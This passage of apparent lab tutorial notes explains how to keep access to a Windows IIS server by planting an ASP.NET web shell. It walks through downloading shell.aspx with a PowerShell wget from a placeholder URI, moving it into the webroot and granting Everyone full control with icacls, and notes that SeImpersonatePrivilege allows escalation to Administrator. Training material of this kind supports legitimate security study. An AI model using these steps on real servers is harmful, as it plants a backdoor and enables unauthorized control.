Web Shell:
If you don't want to use Windows features to hide a backdoor, 
you can always profit from any existing service that can be used to run code for you.

Download remote shell.aspx from Powershell:
    -C:\innetpub\wwwroot>wget URI+Socket/PayloadFilePath -OutFile shell.aspx


The usual way of achieving persistence in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in IIS, which by default is iis apppool\defaultapppool. Even if this is an unprivileged user, it has the special SeImpersonatePrivilege, providing an easy way to escalate to the Administrator using various known exploits. For more information on how to abuse this privilege, see the Windows Privesc Room.

Let's start by downloading an ASP.NET web shell. A ready to use web shell is provided here, but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in the C:\inetpub\wwwroot directory:

Command Prompt
C:\> move shell.aspx C:\inetpub\wwwroot\
Note: Depending on the way you create/transfer shell.aspx, the permissions in the file may not allow the web server to access it. If you are getting a Permission Denied error while accessing the shell's URL, just grant everyone full permissions on the file to get it working. You can do so with icacls shell.aspx /grant Everyone:F.

We can then run commands from the web server by pointing to the following URL:

http://MACHINE_IP/shell.aspx